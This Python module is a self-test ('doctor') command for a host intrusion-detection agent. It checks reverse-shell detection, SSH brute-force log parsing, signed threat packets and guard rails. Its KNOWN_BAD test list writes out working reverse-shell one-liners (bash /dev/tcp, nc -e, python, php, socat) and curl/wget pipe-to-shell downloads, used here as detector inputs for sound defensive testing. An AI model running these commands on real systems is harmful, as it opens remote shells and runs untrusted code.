"""`swarmctl doctor`: prove the detectors work before arming them.

Runs the detection grammar against known-bad and known-good inputs, checks the
signature layer and the guard rails, and reports what the current user and host
can actually see - auth.log permissions, firewall backends, root requirements.
No host state changes.
"""

from __future__ import annotations

import os
import shutil
import socket
import subprocess
import sys
import time

from . import procfs
from .config import Config
from .detect.authbrute import AuthRules
from .detect.authlog import parse_line
from .detect.procs import ProcessWatcher
from .firewall import IN, OUT, Firewall, Rule, normalize
from .respond import Guard
from .signals import BLOCK_IN, KILL_PROCESS, REVERSE_SHELL, Threat
from .signature import SignatureError, ThreatSignature, parse, verify_auth

KNOWN_BAD = [
    ("bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", REVERSE_SHELL, 0.75),
    ("nc 198.51.100.7 4444 -e /bin/bash", REVERSE_SHELL, 0.7),
    ("ncat --exec cmd.exe 203.0.113.9 4444", REVERSE_SHELL, 0.7),
    (
        "python3 -c import socket,subprocess,os;s=socket.socket();s.connect((1,2,3,4));"
        "[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([/bin/sh])",
        REVERSE_SHELL,
        0.6,
    ),
    ("php -r $sock=fsockopen(203.0.113.9,1234);exec(/bin/sh -i <&3 >&3 2>&3);", REVERSE_SHELL, 0.6),
    ("mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | nc 203.0.113.9 4444 > /tmp/s", REVERSE_SHELL, 0.7),
    ("curl -s http://203.0.113.9/x.sh | bash", REVERSE_SHELL, 0.6),
    ("wget -qO- http://198.51.100.7/p.sh | sh", REVERSE_SHELL, 0.6),
    ("socat exec: bash -li,pty,stderr,setsid tcp:203.0.113.9:443", REVERSE_SHELL, 0.7),
    ("ssh -R 0.0.0.0:8484:127.0.0.1:80 relay.example.com", "tunnel_tool", 0.4),
]

KNOWN_GOOD = [
    "python3 manage.py runserver 0.0.0.0:8000",
    "git commit -m fix the thing",
    "npm run build",
    "docker compose up -d",
    "ssh git@github.com",
    "vim notes/todo.md",
    "curl -s https://example.com/api/v1/status | jq .",
    "tar -xzf backup.tar.gz",
]

SSH_LINES = [
    "Oct 25 09:00:01 target sshd[4001]: Failed password for invalid user admin from 203.0.113.9 port 40001 ssh2",
    "Oct 25 09:00:02 target sshd[4002]: Failed password for root from 203.0.113.9 port 40002 ssh2",
    "Oct 25 09:00:03 target sshd[4003]: Failed password for invalid user oracle from 203.0.113.9 port 40003 ssh2",
    "Oct 25 09:00:04 target sshd[4004]: Failed password for root from 203.0.113.9 port 40004 ssh2",
    "Oct 25 09:00:05 target sshd[4005]: Failed password for invalid user test from 203.0.113.9 port 40005 ssh2",
    "Oct 25 09:00:06 target sshd[4006]: Failed password for root from 203.0.113.9 port 40006 ssh2",
]


class StubNetView:
    def __init__(self, connections=()) -> None:
        self._connections = list(connections)

    def connections_of(self, pid: int):
        return self._connections


def _record(line: str, pid: int = 4242):
    from .events import ProcessRecord

    parts = line.split(" ")
    return ProcessRecord(
        pid=pid, ppid=1, uid=1000, comm=parts[0], cmdline=tuple(parts), exe=f"/usr/bin/{parts[0]}",
        cwd="/home/user", started_at=time.time(), state="S",
    )


def test_grammar(report) -> None:
    fired = 0
    for line, expected_attack, minimum in KNOWN_BAD:
        watcher = ProcessWatcher({"quarantine_dirs": ["/tmp"]}, StubNetView(), emit=lambda threat: None)
        assessment = watcher.assess(_record(line))
        if assessment is None:
            report.fail("grammar", f"no assessment for {line[:50]}")
            continue
        if assessment.confidence >= minimum and expected_attack in (assessment.attack, REVERSE_SHELL):
            report.ok("grammar", f"{line[:46]:<46} {assessment.attack} conf={assessment.confidence}")
            fired += 1
        else:
            report.fail(
                "grammar",
                f"{line[:40]} expected {expected_attack}>={minimum} got {assessment.attack}={assessment.confidence}",
            )

    missed = 0
    for line in KNOWN_GOOD:
        watcher = ProcessWatcher({"quarantine_dirs": ["/tmp"]}, StubNetView(), emit=lambda threat: None)
        assessment = watcher.assess(_record(line))
        if assessment and assessment.confidence >= 0.5:
            missed += 1
            report.fail("grammar", f"false positive on benign: {line[:50]} conf={assessment.confidence}")
    if not missed:
        report.ok("grammar", f"{len(KNOWN_GOOD)} benign commands produced no threat")
    if fired != len(KNOWN_BAD):
        report.fail("grammar", f"only {fired}/{len(KNOWN_BAD)} known-bad payloads detected")


def test_auth(report, tmp: str) -> None:
    threats: list[Threat] = []
    rules = AuthRules({"failures": 6, "window": 120, "block_ttl": 3600}, tmp, emit=threats.append)
    parsed = 0
    for line in SSH_LINES:
        event = parse_line(line, now=time.time())
        if event is None:
            report.fail("auth", f"line not parsed: {line[:60]}")
            continue
        parsed += 1
        rules.handle(event)
    if parsed == len(SSH_LINES):
        report.ok("auth", f"{parsed} real-format sshd lines parsed")
    blocks = [threat for threat in threats if threat.attack == "ssh_bruteforce"]
    if blocks and blocks[0].subject == "203.0.113.9" and BLOCK_IN in blocks[0].actions:
        report.ok("auth", f"brute force produced: {blocks[0].evidence[:70]}")
    else:
        report.fail("auth", f"no brute-force threat from {len(SSH_LINES)} failures (got {len(threats)} threats)")

    breaches: list[Threat] = []
    rules = AuthRules({"failures": 6, "window": 120, "block_ttl": 3600}, tmp, emit=breaches.append)
    for line in SSH_LINES:
        rules.handle(parse_line(line, now=time.time()))
    success = parse_line(
        "Oct 25 09:00:07 target sshd[4007]: Accepted password for root from 203.0.113.9 port 40007 ssh2",
        now=time.time(),
    )
    rules.handle(success)
    credential = [threat for threat in breaches if threat.attack == "credential_breach"]
    if credential:
        report.ok("auth", f"post-failure login flagged: {credential[0].evidence[:60]}")
    else:
        report.fail("auth", "successful login after failures did not produce credential_breach")


def test_signature(report) -> None:
    key = os.urandom(32)
    sig = ThreatSignature(
        subject="203.0.113.9", attack="ssh_bruteforce", node="doctor", reason="test", ttl=600.0
    ).with_auth(key)
    stale = ThreatSignature(
        subject="1.2.3.4", attack="ssh_bruteforce", node="doctor", reason="gone", ttl=5.0,
        ts=time.time() - 60.0,
    )
    wire = sig.to_json()
    restored = parse(wire)
    if restored.id != sig.id or not verify_auth(restored, key):
        report.fail("signature", "round-trip mismatch")
    else:
        report.ok("signature", f"{len(wire)}-byte packet round-trips and verifies")

    for label, packet in (
        ("garbage", b"hello"),
        ("missing fields", b'{"tag":"block"}'),
        ("unknown attack", b'{"v":2,"tag":"block","attack":"magic","subject":"1.2.3.4","node":"n","ttl":60,"ts":'
         + str(time.time()).encode() + b',"hop":1}'),
        ("bad address", b'{"v":2,"tag":"block","attack":"ssh_bruteforce","subject":"not-an-ip","node":"n","ttl":60,"ts":'
         + str(time.time()).encode() + b',"hop":1}'),
        ("expired", stale.with_auth(key).to_json()),
        ("hop limit", sig.with_auth(key).to_json().replace(b'"hop":1', b'"hop":9')),
    ):
        try:
            parse(packet)
            report.fail("signature", f"{label} was accepted")
        except SignatureError:
            report.ok("signature", f"{label} rejected")

    forged = ThreatSignature(subject="1.2.3.4", attack="ssh_bruteforce", node="impostor", ttl=600.0)
    forged = ThreatSignature(**{**forged.__dict__, "auth": "deadbeef"})
    if verify_auth(forged, key):
        report.fail("signature", "unauthenticated signature passed verification")
    else:
        report.ok("signature", "signature without the swarm key fails verification")


def test_guard(report, tmp: str) -> None:
    config = Config.default()
    guard = Guard(config.guard, own_pid=os.getpid(), advertise_ip="10.6.0.20", peers=["10.6.0.21"])
    for address, should_allow, why in (
        ("203.0.113.9", True, "ordinary attacker"),
        ("127.0.0.1", False, "loopback"),
        ("10.6.0.20", False, "this host"),
        ("10.6.0.21", False, "a swarm peer"),
        ("8.8.8.8", None, "configured resolver"),
    ):
        allowed, reason = guard.may_block(address)
        if should_allow is None:
            report.ok("guard", f"{address} ({why}): {reason}")
        elif allowed == should_allow:
            report.ok("guard", f"block {address} ({why}) -> {'allowed' if allowed else 'refused'}")
        else:
            report.fail("guard", f"block {address} ({why}) returned {allowed}: {reason}")

    ok, reason = guard.may_kill(1, "systemd", 0, 1.0)
    if not ok:
        report.ok("guard", f"pid 1 protected: {reason}")
    else:
        report.fail("guard", "guard allowed killing pid 1")

    ok, reason = guard.may_kill(os.getpid(), "swarmd", 1000, 1.0)
    if not ok:
        report.ok("guard", f"own process protected: {reason}")
    else:
        report.fail("guard", "guard allowed the agent to kill itself")

    firewall = Firewall.build({"backend": "none", "state_file": os.path.join(tmp, "blocks.json")}, ["10.0.0.0/8"])
    rule = Rule("203.0.113.9", IN, "test", time.time() + 60, "doctor")
    installed, detail = firewall.protect(rule)
    if installed and firewall.snapshot():
        report.ok("guard", "rule recorded and re-readable")
    denied, why = firewall.protect(Rule("10.1.2.3", OUT, "test", time.time() + 60, "doctor"))
    if not denied:
        report.ok("guard", f"allowlisted network refused: {why}")
    else:
        report.fail("guard", "allowlisted address was blocked")
    if firewall.guarded("127.0.0.1"):
        report.ok("guard", "normalize + guarded checks agree")
    report.ok("guard", f"normalize('10.6.0.0/24') = {normalize('10.6.0.0/24')}")


def test_environment(report) -> None:
    euid = os.geteuid()
    report.ok("host", f"running as uid {euid} ({'root: can enforce' if euid == 0 else 'unprivileged: monitor mode only'})")
    for binary in ("iptables", "ip6tables", "nft", "logger", "journalctl"):
        if shutil.which(binary):
            report.ok("host", f"{binary} available")
    for path in ("/var/log/auth.log", "/var/log/syslog", "/proc/net/tcp", "/etc/resolv.conf"):
        readable = os.access(path, os.R_OK)
        (report.ok if readable else report.warn)("host", f"{path} {'readable' if readable else 'NOT readable'}")
    if not os.access("/var/log/auth.log", os.R_OK):
        report.warn("host", "add the agent user to group adm, or use journal units in ssh.journal_units")
    if not shutil.which("iptables") and not shutil.which("nft"):
        report.fail("host", "no firewall backend found: blocking cannot work")
    report.ok("host", f"swarm default port 9911/udp, control socket at $SWARM_CONTROL")


class Report:
    def __init__(self) -> None:
        self.passed = 0
        self.warnings = 0
        self.failed = 0

    def ok(self, area: str, message: str) -> None:
        self.passed += 1
        print(f"  PASS  {area:<6} {message}")

    def warn(self, area: str, message: str) -> None:
        self.warnings += 1
        print(f"  WARN  {area:<6} {message}")

    def fail(self, area: str, message: str) -> None:
        self.failed += 1
        print(f"  FAIL  {area:<6} {message}")

    def summary(self) -> int:
        print(f"\n{self.passed} passed, {self.warnings} warnings, {self.failed} failures")
        return 1 if self.failed else 0


def run_doctor(config_path: str | None = None) -> int:
    import tempfile

    report = Report()
    tmp = tempfile.mkdtemp(prefix="swarm-doctor-")
    print("swarm agent self-test")
    try:
        test_grammar(report)
        test_auth(report, tmp)
        test_signature(report)
        test_guard(report, tmp)
        test_environment(report)
    finally:
        shutil.rmtree(tmp, ignore_errors=True)
    code = report.summary()
    if code == 0:
        print("detection and refusal logic verified; deploy in monitor mode first, then set mode=enforce")
    return code
